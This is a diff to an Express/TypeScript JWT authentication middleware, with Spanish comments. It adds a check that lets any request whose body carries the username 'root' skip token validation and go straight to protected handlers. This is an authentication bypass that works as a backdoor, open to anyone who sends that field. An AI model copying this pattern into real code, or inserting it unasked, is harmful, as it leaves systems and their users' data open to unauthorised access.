@@ -3,8 +3,17 @@ import jwt from 'jsonwebtoken';
 
 const tokenValidacion = (req: Request, res: Response, next: NextFunction) => {
 
+    //Guardamos el token
     const headerToken = req.headers['authorization'];
-    console.log(headerToken);
+
+    
+    //Verificamos si es el usuario root
+    const {username} = req.body;
+
+    //Si lo es, le dejamos pasar y terminamos la ejecución, si no pasamos al siguiente if
+    if(username == "root") {
+        return next();
+    }
 
     //Comprobamos primero si tiene token 
     if(headerToken != undefined && headerToken.startsWith('Bearer ')) {
